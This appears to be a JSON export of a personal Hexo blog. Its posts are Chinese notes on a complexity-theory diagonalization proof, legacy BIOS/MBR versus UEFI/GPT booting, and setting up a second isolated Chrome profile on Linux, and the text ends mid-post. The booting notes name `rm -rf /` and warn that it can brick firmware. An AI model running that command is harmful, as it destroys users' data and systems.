{"meta":{"title":"H-ZeX","subtitle":"H-ZeX's Coding Life","description":null,"author":"H-ZeX","url":"https://h-zex.github.io"},"pages":[{},{},{}],"posts":[{"title":"对ITOC 3rd Theorem 9.20 的一些理解","date":"2018-09-29T06:45:15.000Z","path":"2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/","text":"证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长 按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——无论集合$A$是否构造好，我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致 在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反 可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致 一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以： 如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的 如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO 这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。","raw":"---\ntitle: 对ITOC 3rd Theorem 9.20 的一些理解\ndate: 2018-09-29 14:45:15\ntags:\n- 图灵机\n- P与NP\n- 对角化\ncategories:\n- 计算理论\n---\n\n- {% asset_img 1.png %}\n- 证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长\n- 按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——**无论集合$A$是否构造好，**我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致\n- 在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反\n- 可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致\n- 一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：\n  - 如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的\n  - 如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO\n- 这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。","content":"<ul>\n<li><img src=\"/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/1.png\"></li>\n<li>证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长</li>\n<li>按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——<strong>无论集合$A$是否构造好，</strong>我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致</li>\n<li>在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反</li>\n<li>可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致</li>\n<li>一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：<ul>\n<li>如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的</li>\n<li>如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO</li>\n</ul>\n</li>\n<li>这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。</li>\n</ul>\n","slug":"对ITOC-3rd-Theorem-9-20-的一些理解","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"图灵机","slug":"图灵机","permalink":"https://h-zex.github.io/tags/图灵机/"},{"name":"P与NP","slug":"P与NP","permalink":"https://h-zex.github.io/tags/P与NP/"},{"name":"对角化","slug":"对角化","permalink":"https://h-zex.github.io/tags/对角化/"}]},{"title":"Extend Binary GCD","date":"2018-09-17T13:58:41.000Z","path":"2018/09/17/Extend-Binary-GCD/","text":"","raw":"---\ntitle: Extend Binary GCD\ndate: 2018-09-17 21:58:41\ntags:\ncategories:\n---\n","content":"","slug":"Extend-Binary-GCD","categories":[],"tags":[]},{"title":"Booting a System","date":"2018-09-17T01:22:08.000Z","path":"2018/09/17/Booting-a-System/","text":"Legacy BIOS 传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表 无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record” 第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用 MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的 MBR MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks. EFI Intel’s extensible firmware interface (EFI) EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用 GPT The EFI partitioning scheme, known as a “GUID partition table” or GPT A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started. 只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT. The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy. Windows and GPT FAQ Can a disk be both GPT and MBR?No. However, all GPT disks contain a Protective MBR. What is a Protective MBR?The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk. Why does the GPT have a Protective MBR?The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned. Why would a GPT-partitioned disk appear to have an MBR on it?This occurrs when you use an MBR-only-aware disk tool to access the GPT disk. 如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘 不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。 ESP The EFI system partition (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot. The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see UEFI specification version 2.7, section 13.3.1.1), but any conformant vendor can optionally add support for additional filesystems; for example, Apple Macs support (and by default use) their own HFS+ filesystem drivers. 因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。 At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it. BOOT 没有boot block（除了Protective MBR） 在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader 在modern intel system，UEFI默认从/efi/boot/boot64.efi加载。这个路径可以作为一个参数配置 UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。 因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量 firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写） 在那些默认允许写的系统(typically, those with systemd)，rm -rf / 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through /sys ​","raw":"---\ntitle: Booting a System\ntags:\n- boot\n- unix/linux\ncategories:\n- 运维\ndate: 2018-09-17 09:22:08\n---\n\n## Legacy BIOS \n\n- 传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表\n- 无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as \"active\"的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做\"volume boot record\"\n- 第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的\"dead zone\"。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用\n- MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的\n\n### MBR\n\n- > MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.\n\n## EFI\n\n- Intel’s extensible firmware interface (EFI) \n- EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用\n\n### GPT\n\n- The EFI partitioning scheme, known as a “GUID partition table” or GPT\n\n  > A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.\n\n- 只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID\n\n  > The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.\n  >\n  > The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.\n\n-  > [Windows and GPT FAQ](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq)\n   >\n   > ##### Can a disk be both GPT and MBR?\n   >\n   > No. However, all GPT disks contain a Protective MBR.\n   >\n   > ##### What is a Protective MBR?\n   >\n   > The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.\n   >\n   > ##### Why does the GPT have a Protective MBR?\n   >\n   > The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don't know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.\n   >\n   > ##### Why would a GPT-partitioned disk appear to have an MBR on it?\n   >\n   > This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.\n   >\n\n-  如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘\n\n-  不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。\n\n### ESP \n\n- > The [EFI system partition](https://en.wikipedia.org/wiki/EFI_system_partition) (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.\n  >\n  > The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see [UEFI specification version 2.7, section 13.3.1.1](http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485)), but any conformant vendor can optionally add support for additional filesystems; for example, Apple [Macs](https://wiki.archlinux.org/index.php/Mac) support (and by default use) their own HFS+ filesystem drivers.\n\n- 因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。\n\n- > At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.\n\n### BOOT\n\n- 没有boot block（除了Protective MBR）\n\n- 在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader\n\n- 在modern intel system，UEFI默认从`/efi/boot/boot64.efi`加载。这个路径可以作为一个参数配置\n\n- UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。\n\n- 因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量\n\n- firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）\n\n- 在那些默认允许写的系统(typically, those with systemd)，`rm -rf /` 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through `/sys`\n\n  ​","content":"<h2 id=\"Legacy-BIOS\"><a href=\"#Legacy-BIOS\" class=\"headerlink\" title=\"Legacy BIOS\"></a>Legacy BIOS</h2><ul>\n<li>传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表</li>\n<li>无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record”</li>\n<li>第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用</li>\n<li>MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的</li>\n</ul>\n<h3 id=\"MBR\"><a href=\"#MBR\" class=\"headerlink\" title=\"MBR\"></a>MBR</h3><ul>\n<li><blockquote>\n<p>MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"EFI\"><a href=\"#EFI\" class=\"headerlink\" title=\"EFI\"></a>EFI</h2><ul>\n<li>Intel’s extensible firmware interface (EFI) </li>\n<li>EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用</li>\n</ul>\n<h3 id=\"GPT\"><a href=\"#GPT\" class=\"headerlink\" title=\"GPT\"></a>GPT</h3><ul>\n<li><p>The EFI partitioning scheme, known as a “GUID partition table” or GPT</p>\n<blockquote>\n<p>A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.</p>\n</blockquote>\n</li>\n<li><p>只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID</p>\n<blockquote>\n<p>The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.</p>\n<p>The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p><a href=\"https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq\" target=\"_blank\" rel=\"noopener\">Windows and GPT FAQ</a></p>\n<h5 id=\"Can-a-disk-be-both-GPT-and-MBR\"><a href=\"#Can-a-disk-be-both-GPT-and-MBR\" class=\"headerlink\" title=\"Can a disk be both GPT and MBR?\"></a>Can a disk be both GPT and MBR?</h5><p>No. However, all GPT disks contain a Protective MBR.</p>\n<h5 id=\"What-is-a-Protective-MBR\"><a href=\"#What-is-a-Protective-MBR\" class=\"headerlink\" title=\"What is a Protective MBR?\"></a>What is a Protective MBR?</h5><p>The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.</p>\n<h5 id=\"Why-does-the-GPT-have-a-Protective-MBR\"><a href=\"#Why-does-the-GPT-have-a-Protective-MBR\" class=\"headerlink\" title=\"Why does the GPT have a Protective MBR?\"></a>Why does the GPT have a Protective MBR?</h5><p>The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.</p>\n<h5 id=\"Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it\"><a href=\"#Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it\" class=\"headerlink\" title=\"Why would a GPT-partitioned disk appear to have an MBR on it?\"></a>Why would a GPT-partitioned disk appear to have an MBR on it?</h5><p>This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.</p>\n</blockquote>\n</li>\n<li><p>如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘</p>\n</li>\n<li><p>不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。</p>\n</li>\n</ul>\n<h3 id=\"ESP\"><a href=\"#ESP\" class=\"headerlink\" title=\"ESP\"></a>ESP</h3><ul>\n<li><blockquote>\n<p>The <a href=\"https://en.wikipedia.org/wiki/EFI_system_partition\" target=\"_blank\" rel=\"noopener\">EFI system partition</a> (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.</p>\n<p>The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see <a href=\"http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485\" target=\"_blank\" rel=\"noopener\">UEFI specification version 2.7, section 13.3.1.1</a>), but any conformant vendor can optionally add support for additional filesystems; for example, Apple <a href=\"https://wiki.archlinux.org/index.php/Mac\" target=\"_blank\" rel=\"noopener\">Macs</a> support (and by default use) their own HFS+ filesystem drivers.</p>\n</blockquote>\n</li>\n<li><p>因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。</p>\n</li>\n<li><blockquote>\n<p>At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"BOOT\"><a href=\"#BOOT\" class=\"headerlink\" title=\"BOOT\"></a>BOOT</h3><ul>\n<li><p>没有boot block（除了Protective MBR）</p>\n</li>\n<li><p>在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader</p>\n</li>\n<li><p>在modern intel system，UEFI默认从<code>/efi/boot/boot64.efi</code>加载。这个路径可以作为一个参数配置</p>\n</li>\n<li><p>UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。</p>\n</li>\n<li><p>因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量</p>\n</li>\n<li><p>firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）</p>\n</li>\n<li><p>在那些默认允许写的系统(typically, those with systemd)，<code>rm -rf /</code> 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through <code>/sys</code></p>\n<p>​</p>\n</li>\n</ul>\n","slug":"Booting-a-System","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"boot","slug":"boot","permalink":"https://h-zex.github.io/tags/boot/"},{"name":"unix/linux","slug":"unix-linux","permalink":"https://h-zex.github.io/tags/unix-linux/"}]},{"title":"How to Have Two Chromes at Linux","date":"2018-09-10T13:26:34.000Z","path":"2018/09/10/How-to-Have-Two-Chromes-at-Linux/","text":"需求 由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。 而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。 那么，就需要两个chrome的环境 chrome的用户数据 linux下chrome的默认用户数据存储在/home/&lt;user-name&gt;/.config/google-chrome，可以使用--user-data-dir=DIR参数启动chrome来使得chrome使用另一个目录作为用户data目录 –user-data-dir=DIRSpecifies the directory that user data (your “profile”) is kept in. Defaults to $HOME/.config/google-chrome . Separate instances of GoogleChrome must use separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user datadirectory. 接下来 1234cd /home/&lt;user-name&gt;/.config/mv google-chrome xxx # 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息# 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。） 把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上--user-data-dir=DIR参数打开chrome即可 由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题） 从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome dpkg -x xxx.deb folder即可把deb包解压到folder文件夹中 然后使用使用chown命令修改folder/opt/google/chrome/chrome-sandbox的拥有者为root，然后使用chmod 4755修改该文件的权限，才可以使用这个chrome 使用方法，直接在folder/opt/google/chrome/目录下运行./chrome即可","raw":"---\ntitle: How to Have Two Chromes at Linux\ndate: 2018-09-10 21:26:34\ntags:\n- 运维\n- 小技巧\n- chrome\n- linux\ncategories:\n- 运维\n---\n\n### 需求\n\n- 由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。\n- 而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。\n- 那么，就需要两个chrome的环境\n\n### chrome的用户数据\n\n- linux下chrome的默认用户数据存储在`/home/<user-name>/.config/google-chrome`，可以使用`--user-data-dir=DIR`参数启动chrome来使得chrome使用另一个目录作为用户data目录\n   > --user-data-dir=DIR\n   > Specifies the directory that user data (your \"profile\") is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google\n   > Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data\n   > directory.\n- 接下来\n   ```shell\n   cd /home/<user-name>/.config/\n   mv google-chrome xxx \n   # 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息\n   # 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息\n   ```\n   接下来，打开chrome（不加--user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）\n- 把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上`--user-data-dir=DIR`参数打开chrome即可\n- 由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）\n\n\n### 从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome\n\n- `dpkg -x xxx.deb folder`即可把deb包解压到folder文件夹中\n- 然后使用使用`chown`命令修改`folder/opt/google/chrome/chrome-sandbox`的拥有者为root，然后使用`chmod 4755`修改该文件的权限，才可以使用这个chrome\n- 使用方法，直接在`folder/opt/google/chrome/`目录下运行`./chrome`即可\n","content":"<h3 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h3><ul>\n<li>由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。</li>\n<li>而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。</li>\n<li>那么，就需要两个chrome的环境</li>\n</ul>\n<h3 id=\"chrome的用户数据\"><a href=\"#chrome的用户数据\" class=\"headerlink\" title=\"chrome的用户数据\"></a>chrome的用户数据</h3><ul>\n<li>linux下chrome的默认用户数据存储在<code>/home/&lt;user-name&gt;/.config/google-chrome</code>，可以使用<code>--user-data-dir=DIR</code>参数启动chrome来使得chrome使用另一个目录作为用户data目录<blockquote>\n<p>–user-data-dir=DIR<br>Specifies the directory that user data (your “profile”) is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google<br>Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data<br>directory.</p>\n</blockquote>\n</li>\n<li><p>接下来</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /home/&lt;user-name&gt;/.config/</span><br><span class=\"line\">mv google-chrome xxx </span><br><span class=\"line\"><span class=\"meta\">#</span> 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息</span><br><span class=\"line\"><span class=\"meta\">#</span> 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息</span><br></pre></td></tr></table></figure>\n<p> 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）</p>\n</li>\n<li>把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上<code>--user-data-dir=DIR</code>参数打开chrome即可</li>\n<li>由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）</li>\n</ul>\n<h3 id=\"从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome\"><a href=\"#从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome\" class=\"headerlink\" title=\"从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome\"></a>从chrome 